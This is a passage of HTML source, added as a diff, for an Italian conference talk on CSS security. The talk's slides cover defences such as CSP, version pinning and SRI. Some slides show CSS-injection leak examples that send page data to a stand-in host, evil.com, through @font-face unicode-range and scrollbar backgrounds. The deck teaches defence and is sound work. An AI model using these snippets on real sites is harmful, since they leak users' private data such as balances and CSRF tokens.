+      <div class="uppercase" style="display: flex; justify-content: space-between; align-items: baseline;">
+        <span style="font-size: 75%;">Saldo &euro;</span>
+        <b style="font-size: 140%;">1.234,50</b>
+      </div>
+    </div>
+    <p-fragment index="1">
+      <pre class="language-css"><code>#balance {
+  font-family: EvilSniff;
+}</code></pre>
+    </p-fragment>
+    <p-fragment index="0">
+      <pre class="language-html"><code>&lt;p>Salve, &lt;b>Mario Rossi&lt;/b>&lt;/p>
+&lt;div class="info">
+  &lt;span>Saldo &euro;&lt;/span>
+  &lt;span id="balance">1.234,50&lt;/span>
+&lt;/div></code></pre>
+    </p-fragment>
+    <p-fragment index="2">
+      <pre class="language-css"><code>@font-face {
+  font-family: EvilSniff;
+  src: url(http://evil.com/0.woff)
+       format('woff');
+  unicode-range: U+0040;
+}</code></pre>
+    </p-fragment>
+    <p-fragment class="sketchy-arrow" index="3" style=" width: 4.75em; transform: rotate(215deg); left: 41.5%; top: 45%;"></p-fragment>
+  </div>
+</p-slide>
+<p-slide class="center">
+  <h1>Legature</h1>
+  <p-fragment><p>Perché c'è differenza tra</p></p-fragment>
+  <div class="two-columns">
+    <p-fragment>
+      <h1 style="font-variant-ligatures: no-common-ligatures; text-align: end;">fi</h1>
+    </p-fragment>
+    <p-fragment>
+      <h1 style="text-align: start;">fi</h1>
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center" style="width: 80%;"><code>@font-face {
+  font-family: 'Material Icons';
+  src: local('Material Icons'),
+    url(https://gfonts.com/MaterialIcons.woff) format('woff');
+}</code></pre>
+  <div class="two-columns align-center self-center" style="width: 80%;">
+    <p-fragment>
+      <pre class="language-html"><code>&lt;span class="icon">
+  accessible
+&lt;/span></code></pre>
+    </p-fragment>
+    <p-fragment class="center">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="height: 2.5em;">
+        <circle cx="12" cy="4" r="2"/>
+        <path d="M19 13v-2c-1.54.02-3.09-.75-4.07-1.83l-1.29-1.43c-.17-.19-.38-.34-.61-.45-.01 0-.01-.01-.02-.01H13c-.35-.2-.75-.3-1.19-.26C10.76 7.11 10 8.04 10 9.09V15c0 1.1.9 2 2 2h5v5h2v-5.5c0-1.1-.9-2-2-2h-3v-3.45c1.29 1.07 3.25 1.94 5 1.95zm-6.17 5c-.41 1.16-1.52 2-2.83 2-1.66 0-3-1.34-3-3 0-1.31.84-2.41 2-2.83V12.1a5 5 0 1 0 5.9 5.9h-2.07z"/>
+      </svg>
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <div style="display: flex; gap: 2em; margin: 0 auto 1.5em;">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="height: 2.5em; box-shadow: 0 .25em red;">
+      <circle cx="12" cy="4" r="2"/>
+      <path d="M19 13v-2c-1.54.02-3.09-.75-4.07-1.83l-1.29-1.43c-.17-.19-.38-.34-.61-.45-.01 0-.01-.01-.02-.01H13c-.35-.2-.75-.3-1.19-.26C10.76 7.11 10 8.04 10 9.09V15c0 1.1.9 2 2 2h5v5h2v-5.5c0-1.1-.9-2-2-2h-3v-3.45c1.29 1.07 3.25 1.94 5 1.95zm-6.17 5c-.41 1.16-1.52 2-2.83 2-1.66 0-3-1.34-3-3 0-1.31.84-2.41 2-2.83V12.1a5 5 0 1 0 5.9 5.9h-2.07z"/>
+    </svg>
+    <span style="font-size: 2em; box-shadow: 0 .125em red;">accessible</span>
+  </div>
+  <p-fragment>
+    <h3 class="center">Si può <em>variare le dimensioni</em> del testo</h3>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>::-webkit-scrollbar-track {</code>
+  <p-fragment><code>background: url(http://evil.com/?contains-623);</code></p-fragment>
+<code>}</code></pre>
+  <p-fragment class="landing" style="top: 55%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">😱</div></p-fragment>
+</p-slide>
+    <p-slide>
+  <h1 class="center">Come difendersi?</h1>
+</p-slide>
+<p-slide>
+  <h2 class="our-header">Non usare <code>value="..."</code></h2>
+  <p class="center">Meglio impostare con <b class="javascript">JavaScript</b></p>
+  <div class="two-columns">
+    <p-fragment class="big-x-wrapper">
+      <pre class="language-html"><code>&lt;script>document
+  .querySelector('input[name=csrf]')
+  .value = "1234abcd";
+&lt;/script></code></pre>
+      <p-fragment class="big-x" index="1"></p-fragment>
+    </p-fragment>
+    <p-fragment>
+      <pre class="language-css"><code>script {
+  display: block;
+  font-family: EvilSniff;
+}</code></pre>
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide class="center">
+  <h1>Web Components</h1>
+  <p-fragment>limitano l'area di effetto dei fogli di stile</p-fragment>
+</p-slide>
+<p-slide>
+  <div class="encapsulated-css">
+    <div style="width: 100%;">
+      <code>body</code>
+      <p-fragment class="making evil" index="1"></p-fragment>
+    </div>
+  </div>
+  <p-fragment class="encapsulated-css">
+    <div style="width: 33%;">
+      <code>main-header</code>
+    </div>
+    <div style="width: 34%;">
+      <code>main-content</code>
+    </div>
+    <div style="width: 33%;">
+      <code>main-footer</code>
+    </div>
+  </p-fragment>
+  <p-fragment class="encapsulated-css">
+    <div style="width: 16%;">
+      <code>my-</code>
+      <p-fragment class="making evil" index="2"></p-fragment>
+    </div>
+    <div style="width: 17%;">
+      <code>my-</code>
+    </div>
+    <div style="width: 17%;">
+      <code>my-</code>
+    </div>
+    <div style="width: 17%;">
+      <code>my-</code>
+      <p-fragment class="making target"></p-fragment>
+    </div>
+    <div style="width: 17%;">
+      <code>my-</code>
+    </div>
+    <div style="width: 16%;">
+      <code>my-</code>
+    </div>
+  </p-fragment>
+  <p-fragment index="1">
+    <div class="sketchy-arrow" style="width: 4em;top: 41%;left: 55.5%;transform: rotate(60deg);">
+      <span style="position: relative;top: -0.25em;transform: rotate(23deg);display: inline-block;">❌</span>
+    </div>
+  </p-fragment>
+  <p-fragment index="2">
+    <div class="sketchy-arrow" style="width: 8em;top: 62%;left: 19%;transform: scale(1, -1) rotate(-30deg);">
+      <span style="position: relative;top: 0.25em;transform: rotate(23deg);display: inline-block;">❌</span>
+    </div>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h1 class="center">Content Security Policy</h1>
+</p-slide>
+<p-slide class="center">
+  <pre class="language-css big self-center"><code>Content-Security-Policy: default-src 'self'</code></pre>
+  <pre class="language-html big self-center"><code>&lt;meta http-equiv="Content-Security-Policy"&nbsp;
+      content="default-src 'self'"></code></pre>
+</p-slide>
+<p-slide>
+  <h3 class="center">Direttive CSP</h3>
+  <ul class="self-center">
+    <li>
+      <p-fragment>👉 <code>script-src</code></p-fragment>
+    </li>
+    <li>
+      <p-fragment>👉 <code>style-src</code></p-fragment>
+    </li>
+    <li>
+      <p-fragment>👉 <code>img-src</code></p-fragment>
+    </li>
+    <li>
+      <p-fragment>👉 <code>font-src</code></p-fragment>
+    </li>
+    <li>
+      <p-fragment>👉 <code>media-src</code></p-fragment>
+    </li>
+    <li>
+      <p-fragment>👉 <code>frame-src</code></p-fragment>
+    </li>
+  </ul>
+</p-slide>
+<p-slide class="center">
+  <h3>Report</h3>
+  <pre class="language-js"><code>Report-To: {
+    "group": "csp-endpoint",
+    "max_age": 10886400,
+    "endpoints": [{ "url": "https://test.com/csp" }]
+  }
+Content-Security-Policy: default-src 'self'; report-to csp-endpoint</code></pre>
+  <p-fragment>
+    <pre class="language-js"><code>Content-Security-Policy: default-src 'self'; report-uri https://test.com/csp</code></pre>
+  </p-fragment>
+</p-slide>
+<p-slide class="center">
+  <h1>CDN?</h1>
+  <p-fragment>
+    <h3>Anche nelle CDN può finire contenuto <em>non sicuro</em> o <em>compromesso</em></h3>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="center">Version pinning</h3>
+  <p-fragment class="big-x-wrapper">
+    <pre class="language-html"><code>&lt;link rel="stylesheet" src="https://cdn.com/bootstrap/latest/bootstrap.min.css">
+&lt;script src="https://cdn.com/jquery/latest/jquery.min.js">&lt;/script></code></pre>
+    <p-fragment class="big-x"></p-fragment>
+  </p-fragment>
+  <p-fragment>
+    <pre class="language-html"><code>&lt;link rel="stylesheet" src="https://cdn.com/bootstrap/4.6.1/bootstrap.min.css">
+&lt;script src="https://cdn.com/jquery/3.6.0/jquery.min.js">&lt;/script></code></pre>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="center">Subresource Intergrity (SRI)</h3>
+  <p-fragment class="self-center">
+    <pre class="language-html big"><code>&lt;link rel="stylesheet"
+  src="https://cdn.internal.com/our-font/our-font.css"
+  integrity="sha384-oqVuA..." crossorigin="anonymous"></code></pre>
+  </p-fragment>
+</p-slide>
+    <p-slide>
+  <h4 class="our-header">Links</h4>
+  <ul class="links">
+    <li>
+      🔗 Issue 713521: Eliminate :visited privacy issues once and for all
+      <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=713521">
+        bugs.chromium.org/p/chromium/issues/detail?id=713521
+      </a>
+    </li>
+    <li>
+      🔗 Ceterum censeo: :visited esse delendam 📄
+      <a href="https://arturjanc.com/visited-delenda-est.pdf">
+        arturjanc.com/visited-delenda-est.pdf
+      </a>
+    </li>
+    <li>
+      🔗 CVE-2018-6137
+      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6137">
+        cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6137
+      </a>
+    </li>
+    <li>
+      🔗 Demo: Disabling JavaScript Won’t Save You from Fingerprinting
+      <a href="https://dev.to/savannahjs/demo-disabling-javascript-wont-save-you-from-fingerprinting-4838">
+        dev.to/savannahjs/demo-disabling-javascript-wont-save-you-from-fingerprinting-4838
+      </a>
+    </li>
+  </ul>
+</p-slide>
+<p-slide>
+  <h4 class="our-header">Links</h4>
+  <ul class="links">
+    <li>
+      🔗 PoC: Leak text nodes via CSS injection
+      <a href="https://github.com/cgvwzq/css-scrollbar-attack">
+        github.com/cgvwzq/css-scrollbar-attack
+      </a>
+    </li>
+    <li>
+      🔗 Content Security Policy (CSP)
+      <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">
+        developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+      </a>
+    </li>
+    <li>
+      🔗 Subresource Integrity (SRI)
+      <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">
+        developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
+      </a>
+    </li>
+  </ul>
+</p-slide>
+    <p-slide>
+  <h1 class="center">That's all, folks!<br />👋</h1>
+</p-slide>
+<p-slide>
+  <h3 class="center final-link">
+    <a href="https://maxart2501.github.io/css-security-talk/css-day/">
+      maxart2501.github.io/css-security-talk/css-day/
+    </a>
+    <img src="img/qr-slides.svg" alt="QR Code for the presentation's link">
+  </h3>
+</p-slide>
+<p-slide>
+  <pre class="self-center big"><code class="language-typescript">const question: Question[] = await getQuestions()
+questions.forEach((question: Question) => {
+  question.answer()
+})</code></pre>
+</p-slide>
+  </p-deck>
+  <div role="progressbar" class="presentation-progress" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0"></div>
+  <div role="toolbar" class="presentation-toolbar">
+    <button type="button" class="toggle-mode" title="Toggle speaker mode" aria-label="Toggle speaker mode (Alt-M)">
+      <svg viewBox="0 0 1 1">
+        <path stroke-width="0.1" stroke="currentColor" fill="none"
+          d="M.05 .5h.6v-.45h-.6v.9h.6v-.45M.75 .05h.25M.75 .2h.25M.75 .35h.25" />
+      </svg>
+    </button>
+    <button type="button" class="fullscreen" title="Toggle fullscreen mode" aria-label="Toggle fullscreen mode">
+      <svg viewBox="0 0 1 1">
+        <g stroke="currentColor" fill="none" stroke-width="0.1">
+          <path d="M.05 .3v-.25h.25M.7 .05h.25v.25M.95 .7v.25h-.25M.3 .95h-.25v-.25" />
+          <path d="M.05 .3h.25v-.25M.7 .05v.25h.25M.95 .7h-.25v.25M.3 .95v-.25h-.25" />
+        </g>
+      </svg>
+    </button>
+  </div>
+  <nav class="presentation-nav">
+    <button type="button" class="previous" title="Go backward" aria-label="Go backward"></button>
+    <button type="button" class="next" title="Go forward" aria-label="Go forward"></button>
+  </nav>
+  <script type="module" src="js/main.js"></script>
+  <script type="module" src="js/presentation.js"></script>
+  <script defer src="vendor/prismjs/prism.js"></script>
+  <script defer src="vendor/prismjs/components/prism-typescript.js"></script>
+  <script defer src="vendor/prismjs/components/prism-jsx.js"></script>
+</body>
+
+</html>
